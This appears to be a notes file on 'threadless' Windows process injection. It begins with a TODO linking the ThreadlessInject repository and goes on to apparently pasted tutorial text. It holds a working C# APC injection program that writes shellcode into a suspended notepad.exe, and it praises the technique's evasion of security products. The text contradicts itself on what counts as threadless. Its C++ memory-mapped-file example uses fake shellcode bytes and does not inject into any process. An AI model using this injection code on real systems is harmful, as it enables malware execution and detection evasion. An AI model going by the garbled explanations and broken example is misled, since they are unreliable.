
TODO: read https://github.com/CCob/ThreadlessInject/tree/master

### **Threadless Process Injection Overview**

Threadless process injection typically involves:

1. **Creating a Suspended Process**: The target process is created in a suspended state.
2. **Injecting the Payload**: The payload (shellcode or executable code) is written into the target process’s memory.
3. **Modifying the Execution Flow**: The code modifies the execution flow of the target process to ensure the injected code is executed without creating a new thread.

One popular method involves using **asynchronous procedure calls (APC)** in conjunction with thread hijacking. In this scenario, instead of creating a new thread, the injected code is executed within the context of an existing thread in the target process.

### **Example: Using Asynchronous Procedure Calls (APC)**

Below is an example that demonstrates how to perform threadless process injection using APC in C#:

```csharp
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using Windows.Win32;
using Windows.Win32.Foundation;
using Windows.Win32.System.Memory;
using Windows.Win32.System.Threading;

class Program
{
    static void Main(string[] args)
    {
        // Path to the shellcode or payload
        string shellcodePath = @"C:\path\to\shellcode.bin";
        byte[] shellcode = File.ReadAllBytes(shellcodePath);

        // Target process (e.g., notepad.exe)
        string targetProcessPath = @"C:\Windows\System32\notepad.exe";

        // Step 1: Create the target process in a suspended state
        PROCESS_INFORMATION pi = default;
        STARTUPINFO si = new STARTUPINFO();
        bool success = PInvoke.CreateProcess(null, targetProcessPath, null, null, false, CREATE_PROCESS.CREATE_SUSPENDED, null, null, si, ref pi);

        if (!success)
        {
            throw new InvalidOperationException("Failed to start the target process.");
        }

        try
        {
            // Step 2: Allocate memory in the target process for the shellcode
            IntPtr remoteBuffer = PInvoke.VirtualAllocEx(pi.hProcess, IntPtr.Zero, (nuint)shellcode.Length, MEM_ALLOCATION_TYPE.MEM_COMMIT | MEM_ALLOCATION_TYPE.MEM_RESERVE, PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

            if (remoteBuffer == IntPtr.Zero)
            {
                throw new InvalidOperationException("Failed to allocate memory in the target process.");
            }

            // Step 3: Write the shellcode into the allocated memory
            bool written = PInvoke.WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, (nuint)shellcode.Length, out _);

            if (!written)
            {
                throw new InvalidOperationException("Failed to write shellcode into the target process.");
            }

            // Step 4: Queue the APC to the main thread of the process
            IntPtr hThread = pi.hThread;

            if (!PInvoke.QueueUserAPC(remoteBuffer, hThread, UIntPtr.Zero))
            {
                throw new InvalidOperationException("Failed to queue APC.");
            }

            // Step 5: Resume the thread to trigger the APC execution
            PInvoke.ResumeThread(hThread);
        }
        finally
        {
            // Clean up handles
            PInvoke.CloseHandle(pi.hProcess);
            PInvoke.CloseHandle(pi.hThread);
        }
    }
}
```

### **Explanation of the Code:**

1. **Create Suspended Process**:
   - The target process is created in a suspended state using `CreateProcess`.

2. **Allocate Memory and Write Shellcode**:
   - Memory is allocated in the target process using `VirtualAllocEx`.
   - The shellcode is then written into the allocated memory using `WriteProcessMemory`.

3. **Queue APC**:
   - The shellcode is executed via an APC using `QueueUserAPC`. The APC is queued to the target process’s main thread, and once the thread resumes, the shellcode is executed.

4. **Resume Thread**:
   - The main thread of the target process is resumed using `ResumeThread`, triggering the APC and thus executing the injected code.

### **APC Queueing Details:**

- **APC (Asynchronous Procedure Call)**: APCs allow functions to be executed asynchronously in the context of a specific thread. By queuing an APC, you effectively execute your code when the target thread enters an alertable state.
  
- **Queueing APC**: The `QueueUserAPC` function is used to queue an APC to a specific thread. The function takes a pointer to the shellcode or the function to be executed, the handle to the thread, and an argument.

### **Advantages of Threadless Injection:**

- **Stealth**: No new threads are created, which can help evade detection by certain security products.
- **Efficiency**: Utilizes existing process infrastructure, reducing the footprint.

### **Limitations:**

- **Complexity**: Threadless injection is generally more complex and may require a deeper understanding of Windows internals.
- **Risk**: Modifying an existing thread’s execution flow can lead to process instability if not done correctly.

### **Security Note:**
Threadless injection techniques are highly advanced and can be used maliciously. They should only be used in environments where you have explicit permission, such as controlled penetration testing scenarios. Unauthorized use of such techniques is illegal and unethical.

This example demonstrates a method for threadless process injection by leveraging APCs, allowing you to inject and execute code within a target process without the need to create new threads.

**Threadless Process Injection** is an advanced code injection technique that allows an attacker to execute shellcode within a target process without creating or hijacking a thread. This technique leverages the concept of "threadless" or "asynchronous" execution by utilizing existing system functionalities, such as callbacks or memory-mapped files, to execute code indirectly.

### Key Concepts Behind Threadless Process Injection

1. **Memory-Mapped Files:**
   - Memory-mapped files allow you to map a file or a portion of a file into the virtual address space of a process. The attacker can inject malicious code into the process's memory by manipulating memory-mapped files.

2. **Asynchronous Procedure Calls (APCs):**
   - APCs are functions that execute asynchronously in the context of a particular thread. APCs can be used to execute code in a target process without directly manipulating threads.

3. **Exploiting Callbacks:**
   - Callbacks are functions that are called by the operating system in response to certain events. By placing shellcode at a location where a legitimate callback function expects to find executable code, the attacker can execute the shellcode without creating a new thread.

4. **NtQueueApcThreadEx (Windows 10 and later):**
   - This newer API allows queuing APCs directly to an arbitrary thread, which can be used to execute shellcode without directly suspending or hijacking an existing thread.

### Example Techniques for Threadless Process Injection

#### 1. **Memory-Mapped File with Section Object**
   - The attacker creates a memory-mapped file and injects the shellcode into it. This file can be mapped into the target process's memory space. The malicious code can then be executed indirectly when the target process accesses the memory-mapped file.
   
#### 2. **Callback Exploitation**
   - **Example: GDI Callback**
     - GDI (Graphics Device Interface) callbacks can be exploited to execute shellcode. By placing shellcode in the memory area used by GDI objects (like bitmaps), the attacker can trigger the shellcode when a callback function is executed.

#### 3. **Exploiting Structured Exception Handling (SEH)**
   - An attacker can manipulate the SEH chain in a process to point to their shellcode. When an exception occurs, the shellcode is executed as part of the exception handling process.

### Simplified Example of Threadless Process Injection Using a Memory-Mapped File

Here’s a simplified example in C++ demonstrating how memory-mapped files can be used for injection:

```cpp
#include <windows.h>
#include <iostream>

int main() {
    // Example shellcode that opens a MessageBox
    unsigned char shellcode[] = {
        0x90, 0x90, 0x90, 0x90,  // NOP sled
        0x6a, 0x00,              // push 0 (MB_OK)
        0x68, 0x00, 0x30, 0x00, 0x00, // push "Hello"
        0x68, 0x00, 0x20, 0x00, 0x00, // push "Message"
        0xB8, 0xE0, 0x07, 0x00, 0x00, // mov eax, MessageBoxA address
        0xFF, 0xD0                 // call eax
    };

    // Create a memory-mapped file
    HANDLE hMapFile = CreateFileMapping(
        INVALID_HANDLE_VALUE,  // use paging file
        NULL,                  // default security
        PAGE_EXECUTE_READWRITE, // read/write/executable access
        0,                     // max. object size
        sizeof(shellcode),     // size of hFile
        L"Local\\MyMap");      // name of mapping object

    if (hMapFile == NULL) {
        std::cerr << "Could not create file mapping object (" << GetLastError() << ").\n";
        return 1;
    }

    // Map the view of the file
    LPVOID lpBase = MapViewOfFile(
        hMapFile,               // handle to map object
        FILE_MAP_ALL_ACCESS,    // read/write access
        0,                      // offset high
        0,                      // offset low
        sizeof(shellcode));     // number of bytes to map

    if (lpBase == NULL) {
        std::cerr << "Could not map view of file (" << GetLastError() << ").\n";
        CloseHandle(hMapFile);
        return 1;
    }

    // Copy the shellcode into the mapped memory
    memcpy(lpBase, shellcode, sizeof(shellcode));

    // Now, if the target process accesses this memory, the shellcode will execute.
    // Trigger execution by causing the target process to access this memory.

    // Clean up
    UnmapViewOfFile(lpBase);
    CloseHandle(hMapFile);

    return 0;
}
```

### Explanation:

1. **CreateFileMapping:**
   - Creates a memory-mapped file in the system's page file. The memory is allocated with `PAGE_EXECUTE_READWRITE`, allowing for both writing data and executing it.

2. **MapViewOfFile:**
   - Maps the memory-mapped file into the address space of the process, enabling the shellcode to be placed into that memory region.

3. **Shellcode Execution:**
   - The shellcode is copied into the mapped memory. This memory can be accessed or triggered indirectly by another process or callback function, which leads to the execution of the shellcode.

### Advanced Techniques

Threadless Process Injection can be more complex in practice, as it often involves deeply understanding the target process and carefully manipulating system objects to trigger code execution without creating or hijacking threads directly. Here's a brief look at other advanced techniques:

1. **GDI+ Bitmaps:**
   - Place shellcode within a GDI+ object (such as a bitmap) and trigger execution via GDI callbacks.

2. **Heap Corruption:**
   - Carefully corrupt the process heap so that when the process attempts to handle an exception or perform a specific operation, it inadvertently executes the shellcode.

3. **APC Object Hijacking:**
   - Instead of creating new threads, hijack existing APC objects and manipulate them to point to shellcode.

### Conclusion

Threadless Process Injection is a sophisticated and stealthy technique that avoids the creation of new threads or hijacking existing threads. Instead, it relies on manipulating memory and system callbacks to execute malicious code. Implementing such techniques requires an in-depth understanding of Windows internals and careful attention to detail to avoid detection by modern security mechanisms.

Due to its complexity and potential for abuse, this technique should only be used in controlled environments, such as during authorized penetration testing, and never for unauthorized or malicious purposes.